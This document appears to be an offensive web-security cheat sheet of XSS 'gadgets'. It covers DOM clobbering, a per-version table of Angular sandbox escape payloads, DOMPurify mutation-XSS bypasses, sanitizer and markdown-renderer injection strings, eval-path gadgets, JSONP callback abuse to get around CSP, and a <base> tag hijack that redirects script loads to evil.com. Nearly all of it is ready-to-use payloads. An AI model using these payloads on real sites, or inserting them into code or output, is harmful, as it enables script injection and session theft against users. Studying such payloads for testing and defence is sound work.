# Gadgets — DOM clobbering, sanitizer bypasses, library escapes

Gadgets are pre-existing code pieces you chain into an exploit.
Three families: DOM clobbering (named elements become globals),
sanitizer bypasses (version-locked escapes), and library-specific
gadget chains.

---

## 1. DOM clobbering — named elements become globals

```html
<!-- id/name attributes create window properties: -->
<a id=x href=javascript:alert(1)>x</a>
   → window.x === the anchor element
   → x.href === "javascript:alert(1)"

<img id=x name=y src=z>
   → window.x.y === "z" (name attr of img inside id'd parent)
   → form-y: <form id=x><input name=y></form> → x.y = input el
```

The pattern: app does `obj.prop` where `obj` should be a JS object —
your named element substitutes:

```javascript
// app:
if (window.config && config.isAdmin) grantAdmin();
// clobber:
<a id=config><a id=config name=isAdmin>     — two anchors needed
// or:
<form id=config><input name=isAdmin value=1></form>
   → config.isAdmin = the input element (truthy)

// deeper — obj.prop.subprop:
<form id=config><input name=isAdmin value=1></form>
   → config.isAdmin = input — .value === "1" (a string)
   → if the check is ===true it fails — truthy-checks pass
```

### The clobber primitive table

```html
<a id=x>                            → window.x = anchor
<a id=x name=y href=z>              → x.y doesn't work on anchors —
                                      need form/input nesting
<img name=x id=y>                   → y.x = "x" via img.name? no —
                                      .name isn't a property-path;
                                      use form/input for 2-deep
<form id=x><input name=y>           → x.y = input element
<form id=x><input name=y value=z>   → x.y.value = "z"
<form id=x><button name=y>          → x.y = button
<iframe name=x src=y>               → window.x = the iframe window
<embed name=x>                      → window.x = embed element
<object name=x>                     → window.x = object element
```

Two-level clobbering needs the form+input combo (or nested iframes).
Three+ levels need iframes or collections.

### The `undefined`-clobber — removing protections

```javascript
// app: if (x === undefined) defaultSafe();
// clobber x → the check fails → unsafe path taken
<a id=x>   → window.x = element (not undefined)
```

Or the reverse — clobber a guard the app SETS:

```javascript
// app: if (typeof trusted === 'function') safe();
<a id=trusted>   → trusted = element → typeof = 'object' → unsafe
```

### document.cookies/forms/anchors — the legacy collections

`document.forms`, `document.images`, `document.anchors` — named
elements auto-join these collections. `document.forms.myform` is
the same clobber via the collection.

---

## 2. Angular sandbox escapes — per-version table

| Version | Payload |
|---|---|
| 1.0–1.1.5 | `{{constructor.constructor('alert(1)')()}}` |
| 1.2.0–1.2.18 | `{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a.sub).value,0,'alert(1)')()}}` |
| 1.2.19–1.2.23 | `{{toString.constructor.prototype.toString.call.call([],0,'alert(1)')()}}` |
| 1.2.24–1.2.29 | `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1};alert(1);//')}}` |
| 1.3.0 | `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1};alert(1);//')}}` |
| 1.3.1–1.3.2 | `{{'a'.constructor.prototype.charCodeAt=[].join;$eval('x=1};alert(1);//')}}` |
| 1.3.3–1.3.18 | `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1};alert(1);//')}}` |
| 1.4.0–1.4.9 | `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1};alert(1);//')}}` |
| 1.5.0–1.5.8 | `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1};alert(1);//')}}` |
| 1.5.9–1.5.11 | `{{c=toString.constructor.prototype;c.charAt=[].join;$eval('x=1};alert(1);//')}}` |
| 1.6.0–1.6.x | sandbox removed — `{{$eval('alert(1)')}}` or `{{'a'.constructor('alert(1)')()}}` |

The `[].join` trick: assigning `charAt=[].join` makes `charAt`
return the joined array instead of a char — the sandbox's internal
`charAt` calls get confused. Each version patches the prior escape.

Detection: `angular.version.full` in console, or `ng-app` attr.

---

## 3. DOMPurify bypasses — the sanitizer CVEs

DOMPurify is the standard client-side sanitizer — version-locked
bypasses (the mutation-xss file has the mechanism):

```html
<!-- ≤0.60ish — namespace confusion: -->
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>

<!-- form-isolation bypass: -->
<form><math><mtext></form><form><mglyph><style><img src=x onerror=alert(1)>
   -- the form closes the outer form early — mXSS

<!-- id/name-based (attribute clobbering inside svg): -->
<svg><a id=me xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(1)>
```

The mutations work because DOMPurify serializes-then-reparses —
the first parse is clean, the reparse produces the payload. See
`mutation-xss.md` for the full mXSS mechanics.

---

## 4. Bleach / HTML Purifier / sanitizer.js

```text
bleach (python) — whitelist-based; bypass via:
  - allowed tag + allowed attr combos that chain (a+href+scheme)
  - URI-attr allowed without scheme check → javascript:
  - unclosed-tag handling: <a href="jav	ascript:alert(1)

HTML Purifier (PHP) — strict; historical bypasses via
  - %dd octal sequences, malformed entities
  - URI.AllowedSchemes config leaks javascript:

sanitizer.js / sanitize-html (node):
  - allowedTags + allowedAttributes misconfig
  - data-* attributes allowed → framework reads them into sinks
```

The audit path: read the sanitizer's allowed-tag/attr config in
source — the combination `a`+`href` without scheme-check is the
standard find.

---

## 5. Markdown renderer XSS

```markdown
[a](javascript:alert(1))              -- link-href injection
[a](data:text/html,<script>alert(1)</script>)
[a](&#106;&#97;vascript:alert(1))      -- entity-encoded scheme
[a](jav&#x09;ascript:alert(1))         -- tab-entity inside scheme
![x](javascript:alert(1))               -- img-src (dead — img loads it)
[a](vbscript:msgbox(1))                  -- IE legacy

[a](x"onmouseover="alert(1))           -- attr injection via title
[a](x "onmouseover=alert(1))           -- title-position injection
[a](x\) "onmouseover="alert(1))         -- )-escape + title

<!-- raw HTML passthrough — most renderers allow it: -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<a href=javascript:alert(1)>x</a>
```

markdown-it / marked / showdown differ in the scheme-check —
`markdown-render.md` is the full file.

---

## 6. The prototype-chain gadgets — reaching global functions

```javascript
// from any expression position:
({}).constructor.constructor('alert(1)')()   // → Function('alert(1)')()
''.constructor.constructor('alert(1)')()      // String→Function
[].constructor.constructor('alert(1)')()      // Array→Function
(1).constructor.constructor('alert(1)')()     // Number→Function
true.constructor.constructor('alert(1)')()    // Boolean→Function
alert.constructor('alert(1)')()               // alert IS a Function

// shorter:
top.constructor('alert(1)')()                  // window's ctor
[].find.constructor('alert(1)')()               // via a method
x=>x.constructor('alert(1)')()                  // ... needs a call
```

`constructor.constructor` reaches `Function` — the universal
eval-path when `eval`/`Function` are filtered by name.

---

## 7. Window-method gadgets — alternate eval paths

```javascript
top['eval']('alert(1)')              -- bracket notation
window['ev'+'al']('alert(1)')        -- concat
setTimeout('alert(1)')               -- string timer
setInterval('alert(1)')              -- string interval
Function('alert(1)')()               -- ctor
[].filter.constructor('alert(1)')()  -- method-chain ctor
onerror=eval;throw'alert(1)'         -- onerror=eval + throw string
location='javascript:alert(1)'       -- navigation (context-dep)
location.href='javascript:alert(1)'
open('javascript:alert(1)')           -- window.open js:
import('data:text/javascript,alert(1)')  -- data-URI module
```

`onerror=eval;throw'...'` — binds eval as the error handler then
throws; the thrown string IS the code. Works wherever a string lands
in a handler.

---

## 8. The JSONP gadget — whitelisted-host eval

If CSP allows a host that serves JSONP:

```html
<script src="https://allowed.com/api?callback=alert"></script>
   → response: alert({...}) — the callback name IS your function
<script src="https://allowed.com/u?cb=eval&x=1"></script>
<script src="https://cdn.x.com/jsonp?callback=fetch`//me`//"></script>
```

JSONP endpoints are JS-gadget factories — the `callback`/`cb`/
`jsonp`/`jsonpcallback` param takes any JS identifier/expression.

---

## 9. The `<base>` gadget — relative-URL hijack

```html
<base href="//evil.com/">
   → <script src="/x.js"> loads //evil.com/x.js
   → <a href="/login"> clicks to evil.com/login
<base href="javascript:alert(1)//">
   → relative links resolve under javascript: — click-dependent
<base target="_blank" href="//me/">
```

Needs `base-uri` CSP missing + injection point in `<head>`.

---

## 10. The `document.write` gadget — the classic

```javascript
document.write('<img src=x onerror=alert(1)>')
document.write('<script>alert(1)</script>')   -- script DOES run
```

If any `document.write` accepts your input — script tags inside it
execute (unlike innerHTML). Only during initial page parse though —
after `DOMContentLoaded` document.write rewrites the whole page.

---

## 11. `location`-based gadgets — fragment-as-code

```javascript
location = 'javascript:'+location.hash.slice(1);
   -- page navigates to javascript:URL — the hash is the payload
   -- attack URL: https://target/#alert(1)

eval(location.hash.slice(1))          -- hash is code
eval(location.search.slice(1))         -- query is code
eval(name)                             -- window.name is code
```

The carrier separation: the stored/reflected piece is tiny
(`eval(location.hash.slice(1))` or `eval(name)`), the real payload
rides in the URL or the opener's window.name.
